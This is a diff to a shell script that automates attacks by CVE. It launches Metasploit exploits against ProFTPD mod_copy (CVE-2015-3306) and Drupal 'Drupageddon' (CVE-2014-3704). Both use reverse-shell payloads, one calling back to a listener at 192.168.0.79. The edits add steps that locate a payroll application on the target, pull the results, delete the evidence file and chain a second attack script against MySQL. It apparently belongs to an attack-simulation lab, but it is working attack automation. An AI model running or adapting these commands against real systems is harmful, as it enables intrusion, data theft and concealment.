@@ -11,15 +11,16 @@ then
 elif [ $ATTACK == "CVE-2015-3306" ]
 then
 	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; exit; " 
-	# in command shell run locate payroll_app. >> results.txt and then download results.txt \results.txt
-	SERVER = cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2
-	./attack-script $TARGET mysql $SERVER 
+	# in command shell run locate payroll_app. >> results.txt and then download results.txt \results.txt and then rm results.txt
+	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
+	rm results.txt
+	./attack-script.sh $TARGET mysql $SERVER 
 	echo "baseScore_V2: 10"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2014-3704" ]
 then 
-	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; exit; "
+	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; "
 	echo "baseScore_V2: 7.5"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
